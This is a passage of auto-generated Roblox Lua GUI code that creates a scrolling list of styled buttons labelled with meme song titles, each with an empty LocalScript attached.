		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["64"] = Instance.new("LocalScript", G2L["63"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["65"] = Instance.new("TextButton", G2L["55"]);
		G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["65"]["TextSize"] = 20;
		G2L["65"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["65"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["65"]["ClipsDescendants"] = true;
		G2L["65"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["65"]["Text"] = [[Erika Remix]];
		G2L["65"]["Position"] = UDim2.new(0.77375, 0, 0.30714, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["66"] = Instance.new("LocalScript", G2L["65"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["67"] = Instance.new("TextButton", G2L["55"]);
		G2L["67"]["TextWrapped"] = true;
		G2L["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["67"]["TextSize"] = 20;
		G2L["67"]["TextScaled"] = true;
		G2L["67"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["67"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["67"]["ClipsDescendants"] = true;
		G2L["67"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["67"]["Text"] = [[BP Bypassed]];
		G2L["67"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["68"] = Instance.new("LocalScript", G2L["67"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["69"] = Instance.new("TextButton", G2L["55"]);
		G2L["69"]["TextWrapped"] = true;
		G2L["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["69"]["TextSize"] = 20;
		G2L["69"]["TextScaled"] = true;
		G2L["69"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["69"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["69"]["ClipsDescendants"] = true;
		G2L["69"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["69"]["Text"] = [[Loud Nasheed]];
		G2L["69"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["6a"] = Instance.new("LocalScript", G2L["69"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["6b"] = Instance.new("TextButton", G2L["55"]);
		G2L["6b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6b"]["TextSize"] = 20;
		G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["6b"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["6b"]["ClipsDescendants"] = true;
		G2L["6b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6b"]["Text"] = [[Moonman]];
		G2L["6b"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["6c"] = Instance.new("LocalScript", G2L["6b"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["6d"] = Instance.new("TextButton", G2L["55"]);
		G2L["6d"]["TextWrapped"] = true;
		G2L["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6d"]["TextSize"] = 20;
		G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["6d"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["6d"]["ClipsDescendants"] = true;
		G2L["6d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6d"]["Text"] = [[Headrage]];
		G2L["6d"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["6e"] = Instance.new("LocalScript", G2L["6d"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["6f"] = Instance.new("TextButton", G2L["55"]);
		G2L["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6f"]["TextSize"] = 20;
		G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["6f"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["6f"]["ClipsDescendants"] = true;
		G2L["6f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6f"]["Text"] = [[B2Pistolz]];
		G2L["6f"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["70"] = Instance.new("LocalScript", G2L["6f"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["71"] = Instance.new("TextButton", G2L["55"]);
		G2L["71"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["71"]["TextSize"] = 20;
		G2L["71"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["71"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["71"]["ClipsDescendants"] = true;
		G2L["71"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["71"]["Text"] = [[Yunghead]];
		G2L["71"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["72"] = Instance.new("LocalScript", G2L["71"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["73"] = Instance.new("TextButton", G2L["55"]);
		G2L["73"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["73"]["TextSize"] = 20;
		G2L["73"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["73"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["73"]["ClipsDescendants"] = true;
		G2L["73"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["73"]["Text"] = [[CS Revenge]];
		G2L["73"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["74"] = Instance.new("LocalScript", G2L["73"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["75"] = Instance.new("TextButton", G2L["55"]);
		G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["75"]["TextSize"] = 20;
		G2L["75"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["75"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["75"]["ClipsDescendants"] = true;
		G2L["75"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["75"]["Text"] = [[Tri Poloski]];
		G2L["75"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["76"] = Instance.new("LocalScript", G2L["75"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["77"] = Instance.new("TextButton", G2L["55"]);
		G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["77"]["TextSize"] = 20;
		G2L["77"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["77"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["77"]["ClipsDescendants"] = true;
		G2L["77"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["77"]["Text"] = [[Wassa]];
		G2L["77"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["78"] = Instance.new("LocalScript", G2L["77"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["79"] = Instance.new("TextButton", G2L["55"]);
		G2L["79"]["TextWrapped"] = true;
		G2L["79"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["79"]["TextSize"] = 20;
		G2L["79"]["TextScaled"] = true;
		G2L["79"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["79"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["79"]["ClipsDescendants"] = true;
		G2L["79"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["79"]["Text"] = [[Lotsa Spaghetti]];
		G2L["79"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["7a"] = Instance.new("LocalScript", G2L["79"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["7b"] = Instance.new("TextButton", G2L["55"]);
		G2L["7b"]["TextWrapped"] = true;
		G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7b"]["TextSize"] = 20;
		G2L["7b"]["TextScaled"] = true;
		G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["7b"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["7b"]["ClipsDescendants"] = true;
		G2L["7b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7b"]["Text"] = [[LS Running in The 90s]];
		G2L["7b"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["7c"] = Instance.new("LocalScript", G2L["7b"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["7d"] = Instance.new("TextButton", G2L["55"]);
		G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7d"]["TextSize"] = 20;
		G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["7d"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["7d"]["ClipsDescendants"] = true;
		G2L["7d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7d"]["Text"] = [[2K21 Jump]];
		G2L["7d"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["7e"] = Instance.new("LocalScript", G2L["7d"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["7f"] = Instance.new("TextButton", G2L["55"]);
		G2L["7f"]["TextWrapped"] = true;
		G2L["7f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7f"]["TextSize"] = 20;
		G2L["7f"]["TextScaled"] = true;
		G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["7f"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["7f"]["ClipsDescendants"] = true;
		G2L["7f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7f"]["Text"] = [[Epic Sax Guy]];
		G2L["7f"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["80"] = Instance.new("LocalScript", G2L["7f"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["81"] = Instance.new("TextButton", G2L["55"]);
		G2L["81"]["TextWrapped"] = true;
		G2L["81"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["81"]["TextSize"] = 20;
		G2L["81"]["TextScaled"] = true;
		G2L["81"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["81"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["81"]["ClipsDescendants"] = true;
		G2L["81"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["81"]["Text"] = [[Sesame Street]];
		G2L["81"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["82"] = Instance.new("LocalScript", G2L["81"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["83"] = Instance.new("TextButton", G2L["55"]);
		G2L["83"]["TextWrapped"] = true;
		G2L["83"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["83"]["TextSize"] = 20;
		G2L["83"]["TextScaled"] = true;
		G2L["83"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["83"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["83"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["83"]["ClipsDescendants"] = true;
		G2L["83"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["83"]["Text"] = [[Meet Yo Maker]];
		G2L["83"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["84"] = Instance.new("LocalScript", G2L["83"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["85"] = Instance.new("TextButton", G2L["55"]);
		G2L["85"]["TextWrapped"] = true;
		G2L["85"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["85"]["TextSize"] = 20;
		G2L["85"]["TextScaled"] = true;
		G2L["85"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["85"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["85"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["85"]["ClipsDescendants"] = true;
		G2L["85"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["85"]["Text"] = [[Euro Techno]];
		G2L["85"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["86"] = Instance.new("LocalScript", G2L["85"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["87"] = Instance.new("TextButton", G2L["55"]);
		G2L["87"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["87"]["TextSize"] = 20;
		G2L["87"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["87"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["87"]["ClipsDescendants"] = true;
		G2L["87"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["87"]["Text"] = [[EEYUH!]];
		G2L["87"]["Position"] = UDim2.new(0.77375, 0, 0.30714, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["88"] = Instance.new("LocalScript", G2L["87"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["89"] = Instance.new("TextButton", G2L["55"]);
		G2L["89"]["TextWrapped"] = true;
		G2L["89"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["89"]["TextSize"] = 20;
		G2L["89"]["TextScaled"] = true;
		G2L["89"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["89"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["89"]["ClipsDescendants"] = true;
		G2L["89"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["89"]["Text"] = [[Bonita RFunk]];
		G2L["89"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["8a"] = Instance.new("LocalScript", G2L["89"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["8b"] = Instance.new("TextButton", G2L["55"]);
		G2L["8b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8b"]["TextSize"] = 20;
		G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["8b"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["8b"]["ClipsDescendants"] = true;
		G2L["8b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8b"]["Text"] = [[MLG Darude]];
		G2L["8b"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["8c"] = Instance.new("LocalScript", G2L["8b"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["8d"] = Instance.new("TextButton", G2L["55"]);
		G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8d"]["TextSize"] = 20;
		G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["8d"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["8d"]["ClipsDescendants"] = true;
		G2L["8d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8d"]["Text"] = [[Love Bomb]];
		G2L["8d"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["8e"] = Instance.new("LocalScript", G2L["8d"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["8f"] = Instance.new("TextButton", G2L["55"]);
		G2L["8f"]["TextWrapped"] = true;
		G2L["8f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8f"]["TextSize"] = 20;
		G2L["8f"]["TextScaled"] = true;
		G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["8f"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["8f"]["ClipsDescendants"] = true;
		G2L["8f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8f"]["Text"] = [[Rupert Looped]];
		G2L["8f"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["90"] = Instance.new("LocalScript", G2L["8f"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["91"] = Instance.new("TextButton", G2L["55"]);
		G2L["91"]["TextWrapped"] = true;
		G2L["91"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["91"]["TextSize"] = 20;
		G2L["91"]["TextScaled"] = true;
		G2L["91"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["91"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["91"]["ClipsDescendants"] = true;
		G2L["91"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["91"]["Text"] = [[Kirkiimad Ily]];
		G2L["91"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["92"] = Instance.new("LocalScript", G2L["91"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["93"] = Instance.new("TextButton", G2L["55"]);
		G2L["93"]["TextWrapped"] = true;
		G2L["93"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["93"]["TextSize"] = 20;
		G2L["93"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["93"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["93"]["ClipsDescendants"] = true;
		G2L["93"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["93"]["Text"] = [[Toxic]];
		G2L["93"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["94"] = Instance.new("LocalScript", G2L["93"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["95"] = Instance.new("TextButton", G2L["55"]);
		G2L["95"]["TextWrapped"] = true;
		G2L["95"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["95"]["TextSize"] = 20;
		G2L["95"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["95"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["95"]["ClipsDescendants"] = true;
		G2L["95"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["95"]["Text"] = [[Moonman 2]];
		G2L["95"]["Position"] = UDim2.new(0.77375, 0, 0.30714, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["96"] = Instance.new("LocalScript", G2L["95"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["97"] = Instance.new("TextButton", G2L["55"]);
		G2L["97"]["TextWrapped"] = true;
		G2L["97"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["97"]["TextSize"] = 20;
		G2L["97"]["TextScaled"] = true;
		G2L["97"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["97"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["97"]["ClipsDescendants"] = true;
		G2L["97"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["97"]["Text"] = [[Number One MLG]];
		G2L["97"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["98"] = Instance.new("LocalScript", G2L["97"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["99"] = Instance.new("TextButton", G2L["55"]);
		G2L["99"]["TextWrapped"] = true;
		G2L["99"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["99"]["TextSize"] = 20;
		G2L["99"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["99"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["99"]["ClipsDescendants"] = true;
		G2L["99"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["99"]["Text"] = [[Ultimate]];
		G2L["99"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["9a"] = Instance.new("LocalScript", G2L["99"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["9b"] = Instance.new("TextButton", G2L["55"]);
		G2L["9b"]["TextWrapped"] = true;
		G2L["9b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9b"]["TextSize"] = 20;
		G2L["9b"]["TextScaled"] = true;
		G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["9b"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["9b"]["ClipsDescendants"] = true;
		G2L["9b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9b"]["Text"] = [[Jumpstyle Party]];
		G2L["9b"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["9c"] = Instance.new("LocalScript", G2L["9b"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["9d"] = Instance.new("TextButton", G2L["55"]);
		G2L["9d"]["TextWrapped"] = true;
		G2L["9d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9d"]["TextSize"] = 20;
		G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["9d"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["9d"]["ClipsDescendants"] = true;
		G2L["9d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9d"]["Text"] = [[KMA x BINT]];
		G2L["9d"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["9e"] = Instance.new("LocalScript", G2L["9d"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["9f"] = Instance.new("TextButton", G2L["55"]);
		G2L["9f"]["TextWrapped"] = true;
		G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9f"]["TextSize"] = 20;
		G2L["9f"]["TextScaled"] = true;
		G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["9f"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["9f"]["ClipsDescendants"] = true;
		G2L["9f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9f"]["Text"] = [[Hardstyle JM]];
		G2L["9f"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["a1"] = Instance.new("TextButton", G2L["55"]);
		G2L["a1"]["TextWrapped"] = true;
		G2L["a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a1"]["TextSize"] = 20;
		G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
